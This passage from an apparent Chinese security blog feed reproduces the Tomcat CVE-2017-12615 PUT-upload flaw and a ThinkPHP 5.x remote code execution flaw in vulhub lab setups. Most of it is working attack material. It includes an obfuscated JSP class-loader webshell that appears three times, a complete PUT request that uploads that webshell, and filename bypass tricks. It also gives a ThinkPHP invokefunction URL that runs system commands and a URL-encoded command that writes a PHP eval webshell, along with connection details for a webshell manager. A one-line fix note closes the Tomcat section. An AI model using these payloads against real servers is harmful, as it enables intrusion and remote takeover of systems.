&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;% String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>上传111.war文件&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160012.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160033.png" alt="image.png">&lt;br>
访问 172.16.2.174:8080/11/11.jsp，无任何回显。（这里我的码错了，方法都是一样的，我又重新上传了一下）&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161029.png" alt="image.png">&lt;/p>
&lt;p>&lt;strong>上蚁剑&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/11/11.jsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：pass
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161012.png" alt="image.png">&lt;/p></description></item><item><title>【Tomcat漏洞复现】CVE-2017-12615任意文件写入</title><link>http://localhost:1313/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</guid><description>&lt;img src="http://localhost:1313/images/34.webp" alt="Featured image of post 【Tomcat漏洞复现】CVE-2017-12615任意文件写入" />&lt;h1 id="漏洞详情">漏洞详情&lt;/h1>
&lt;p>当 Tomcat 运行在 Windows 系统且启用了 HTTP PUT 方法（通过将 &lt;code>readonly&lt;/code> 参数设置为 &lt;code>false&lt;/code>）时，攻击者可构造恶意请求上传 JSP 文件，导致服务器执行任意代码，进而引发数据泄露或服务器权限被控制。&lt;br>
&lt;strong>关键点：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>触发条件&lt;/strong>：需手动修改 &lt;code>conf/web.xml&lt;/code> 文件中的 &lt;code>readonly&lt;/code> 参数为 &lt;code>false&lt;/code>（默认值为 &lt;code>true&lt;/code>，PUT/DELETE 方法被禁用）。&lt;/li>
&lt;li>&lt;strong>绕过限制&lt;/strong>：Tomcat 默认通过 &lt;code>JspServlet&lt;/code> 处理 &lt;code>.jsp&lt;/code> 文件的上传，但攻击者可通过以下方式绕过限制，使文件由处理静态资源的 &lt;code>DefaultServlet&lt;/code> 处理：
&lt;ul>
&lt;li>文件名后添加空格（&lt;code>evil.jsp%20&lt;/code>，利用 Windows 不允许文件名以空格结尾的特性）。&lt;/li>
&lt;li>使用 NTFS 文件流特性（&lt;code>evil.jsp::$DATA&lt;/code>）。&lt;/li>
&lt;li>文件名后添加斜杠（&lt;code>evil.jsp/&lt;/code>，此方法甚至影响 Linux 系统及 Tomcat 5.x-9.x 版本）4711。&lt;br>
&lt;strong>影响范围：&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>受影响的 Tomcat 版本&lt;/strong>：
&lt;ul>
&lt;li>Apache Tomcat 7.0.0 至 7.0.81（官方公告范围）。&lt;/li>
&lt;li>部分测试显示 Tomcat 8.5.19 等版本也可能受影响。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>操作系统&lt;/strong>：主要针对 Windows，但通过添加斜杠的绕过方式（&lt;code>evil.jsp/&lt;/code>）可扩展至 Linux 系统。&lt;br>
&lt;strong>攻击思路：&lt;/strong>&lt;br>
​ 上传木马文件，webshell管理工具进行连接&lt;/li>
&lt;/ul>
&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;p>使用vulhub进行搭建：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub/tomcat/CVE-2017-12615
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133115.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞复现">漏洞复现&lt;/h1>
&lt;p>&lt;strong>burpsuite抓包&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133228.png" alt="image.png">&lt;br>
使用&lt;code>webshell generate&lt;/code>快速生成木马，项目地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/cseroad/Webshell_Generate
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133326.png" alt="image.png">&lt;br>
一句话木马：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;% String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>将生成的木马上传。这里使用&lt;strong>PUT&lt;/strong>方法进行上传，文件名可以是&lt;code>/xxx.jsp/&lt;/code>、&lt;code>/xxx.jsp%20&lt;/code>、&lt;code>/xxx::$DATA&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">PUT /123.jsp/ HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host: 192.168.197.140:8080
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Encoding: gzip, deflate, br
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection: keep-alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Upgrade-Insecure-Requests: 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Priority: u=0, i
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Length: 946
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;% String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133512.png" alt="image.png">&lt;br>
返回&lt;strong>201&lt;/strong>即上传成功，使用蚁剑进行连接&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/123.jsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133602.png" alt="image.png">&lt;/p>
&lt;h1 id="绕过姿势">绕过姿势&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">1.Windows下不允许文件以空格结尾以
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2.WindowsNTFS流
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Put/a001.jsp::$DATA HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3. /在文件名中是非法的， 也会被去除（Linux/Windows）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Put/a001.jsp/http:/1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="修复建议">修复建议&lt;/h1>
&lt;p>把readonly 改成true&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;init-param&amp;gt; &amp;lt;param-name&amp;gt;readonly&amp;lt;/param-name&amp;gt; &amp;lt;paramvalue&amp;gt;true&amp;lt;/param-value&amp;gt;&amp;lt;/init-param&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link><pubDate>Wed, 03 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/30.webp" alt="Featured image of post 【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞" />&lt;h1 id="0x00-简介">0x00 简介&lt;/h1>
&lt;p>ThinkPHP(FCS)是一个轻量级的中型框架， 是从Java的Struts结构移植过来的中文PHP开发框架。 它使用面向对象的开发结构和MVC模式， 并且模拟实现了Struts的标签库， 各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。ThinkPHP的宗旨是简化开发、 提高效率、 易于扩展， 其在对数据库的支持方面已经包括MySQL、 MSSQL、Sqlite、 PgSQL、Oracle， 以及PDO的支持。 ThinkPHP有着丰富的文档和示例， 框架的兼容性较强， 但是其功能有限，因此更适合用于中小项目的开发。&lt;/p>
&lt;h1 id="0x01-漏洞概述">0x01 漏洞概述&lt;/h1>
&lt;p>ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞， 该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤。 远程攻击者可通过输入‘＼ ’字符的方式调用任意方法利用该漏洞执行代码。&lt;/p>
&lt;h1 id="0x02-影响版本">0x02 影响版本&lt;/h1>
&lt;p>thinkphp 5.0.x&lt;br>
thinkphp 5.1.x&lt;/p>
&lt;h1 id="0x03-环境搭建">0x03 环境搭建&lt;/h1>
&lt;h2 id="1-在docker容器里搭建环境">1、 在docker容器里搭建环境&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub-master/thinkphp/5-rce/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="2-进入目录下-启动环境">2、 进入目录下， 启动环境&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="3-查看环境端口">3、 查看环境端口&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">docker ps -a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里我使用的是我自己的Ubuntu系统搭建的。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125256.png" alt="image.png">&lt;br>
直接访问以下链接即可。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125352.png" alt="image.png">&lt;/p>
&lt;h1 id="0x04-验证方式">0x04 验证方式&lt;/h1>
&lt;p>GET方式尝试命令执行，具体请求如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">197.140&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8080&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">think&lt;/span>\&lt;span class="n">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">call_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125633.png" alt="image.png">&lt;/p>
&lt;h1 id="0x05-利用方式">0x05 利用方式&lt;/h1>
&lt;h2 id="1url编码一句话木马内容">1、URL编码一句话木马内容：&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22x%22%5D%29%3F%3E%27%20%3Eshell.php%20
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="2-直接访问连接">2. 直接访问连接：&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">197.140&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8080&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>\&lt;span class="n">think&lt;/span>\&lt;span class="n">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">call_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">27&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">Fphp&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">40&lt;/span>&lt;span class="n">eval&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="n">_POST&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="n">B&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="n">D&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">27&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">Eshell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125935.png" alt="image.png">&lt;/p>
&lt;h2 id="3-上传一句话木马">3. 上传一句话木马:&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">webshell地址：http://192.168.197.140:8080/shell.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">password：x
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="4-连接成功">4. 连接成功！！！&lt;/h2>
